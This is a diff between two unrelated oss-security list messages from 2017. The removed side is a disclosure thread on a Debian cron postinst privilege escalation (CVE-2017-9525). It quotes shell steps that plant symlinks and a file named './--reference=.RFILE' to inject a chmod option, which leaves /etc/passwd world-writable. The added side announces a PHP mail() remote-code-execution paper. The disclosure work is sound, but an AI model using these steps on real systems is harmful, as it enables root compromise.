@@ -1,97 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/09/7
-Message-ID: <20170609183124.x5zum2fdfegrnkzp@eldamar.local>
-Date: Fri, 9 Jun 2017 20:31:24 +0200
-From: Salvatore Bonaccorso <carnil@...ian.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/03/13
+Message-ID: <CADSYzstfctEZTo4GKGR-H2WXC3kZRSAj7sj7ZHCAu9C7Ff5BYw@mail.gmail.com>
+Date: Wed, 3 May 2017 17:32:03 -0300
+From: Dawid Golunski <dawid@...alhackers.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Vixie/ISC Cron group crontab to root escalation
+Subject: [white-paper] Pwning PHP mail() function For Fun And RCE (ver 1.0)
 Content-Type: text/plain; charset=utf-8
 
-Hi
+Here's a paper I wrote back in December.  It was originally meant to go
+into Phrack but the team wanted a more general article on parameter injection
+as mail() was supposedly an outdated technique.
+Meanwhile, the RCE-chain continues :) So I decided to post it as it is without
+changing it as mail() injection deserves a separate article imho.
 
-On Thu, Jun 08, 2017 at 08:05:34PM +0200, Solar Designer wrote:
-> In 2003, the original patch went from Owl into Debian (and thus Ubuntu),
-> along with the original comment above:
-> 
-> https://anonscm.debian.org/cgit/pkg-cron/pkg-cron.git/commit/?id=ce8f4773590dd76505631bd71874e999a85de607
-> 
-> Thanks to Salvatore Bonaccorso of Debian for locating the above URL for
-> the current discussion.  In there, we also see the addition of a
-> postinst script changing permissions on existing crontab files.  This
-> was also pointed out by Seth Arnold of Ubuntu, who wrote:
-> 
-> | - postinst scripts are already brittle
-> | - postinst scripts themselves become a target for elevating privileges if
-> |   they'll just set the permissions as needed
-> | 
-> | But the Debian/Ubuntu packaging already has scripts for this purpose:
-> | 
-> | http://sources.debian.net/src/cron/3.0pl1-128/debian/postinst/#L53
-> | 
-> | ...
-> | # Fixup crontab , directory and files for new group 'crontab'.
-> | # Can't use dpkg-statoverride for this because it doesn't cooperate nicely
-> | # with cron alternatives such as bcron
-> | if [ -d $crondir/crontabs ] ; then
-> |     chown root:crontab $crondir/crontabs
-> |     chmod 1730 $crondir/crontabs
-> |     # This used to be done conditionally. For versions prior to "3.0pl1-81"
-> |     # It has been disabled to suit cron alternative such as bcron.
-> |     cd $crondir/crontabs
-> |     set +e
-> |     ls -1 | xargs -r -n 1 --replace=xxx  chown 'xxx:crontab' 'xxx'
-> |     ls -1 | xargs -r -n 1 chmod 600
-> |     set -e
-> | fi
-> 
-> Qualys promptly broke this script, replying to Seth:
-> 
-> | Hmmm, you're right, the script itself is vulnerable to
-> | group-crontab-to-root escalation of privileges:
-> | 
-> | root@...ian:~# usermod --append --groups crontab nobody
-> | root@...ian:~# su --login --shell /bin/bash nobody
-> | No directory, logging in with HOME=/
-> | 
-> | nobody@...ian:/$ id
-> | uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup),107(crontab)
-> | 
-> | nobody@...ian:/$ cd /var/spool/cron/crontabs
-> | 
-> | # for example, this exploits the chown
-> | nobody@...ian:/var/spool/cron/crontabs$ ln --symbolic /etc/passwd- nobody
-> | 
-> | # for example, this exploits the chmod
-> | nobody@...ian:/var/spool/cron/crontabs$ touch ./--reference=.RFILE
-> | nobody@...ian:/var/spool/cron/crontabs$ chmod 0666 .RFILE > .RFILE
-> | nobody@...ian:/var/spool/cron/crontabs$ ln --symbolic /etc/passwd 600
-> | 
-> | nobody@...ian:/var/spool/cron/crontabs$ ls -l /etc/passwd*
-> | -rw-r--r-- 1 root root 1378 May 10 17:16 /etc/passwd
-> | -rw------- 1 root root 1378 May 10 17:16 /etc/passwd-
-> | 
-> | # run the postinst script
-> | root@...ian:~# dpkg-reconfigure cron
-> | chown: missing operand
-> | Try 'chown --help' for more information.
-> | update-rc.d: warning: start and stop actions are no longer supported; falling back to defaults
-> | 
-> | nobody@...ian:/var/spool/cron/crontabs$ ls -l /etc/passwd*
-> | -rw-rw-rw- 1    600 crontab 1378 May 10 17:16 /etc/passwd
-> | -rw------- 1 nobody crontab 1378 May 10 17:16 /etc/passwd-
-> | 
-> | So this is a known issue?  (there may be more ways to exploit it --
-> | spaces, newlines, option injections, etc).
-> 
-> So this looked like two issues to fix: the temporary file hard link
-> attack (in OpenBSD, Debian, Ubuntu, ALT Linux, and Owl) and the postinst
-> script (in Debian and Ubuntu).
+https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html
 
-For the record, the Debian and Ubuntu specific issue with the postinst
-script has been assigned CVE-2017-9525.
+I reveal some exim code-execution vectors in there that should change
+the whole game slightly :)
 
-For further discussion with the Debian cron maintainers I have as well
-opened https://bugs.debian.org/864466
+See my exploit for WordPress Core that is based on it:
+https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
+
+
+I'll attach copies of the white-paper here in the next revision as I
+haven't slept for 3 nights and need to double check on everything
+before it goes into the archive forever :)
+
 
 Regards,
-Salvatore
+Dawid Golunski
+https://legalhackers.com
+https://ExploitBox.io
+t: @dawid_golunski
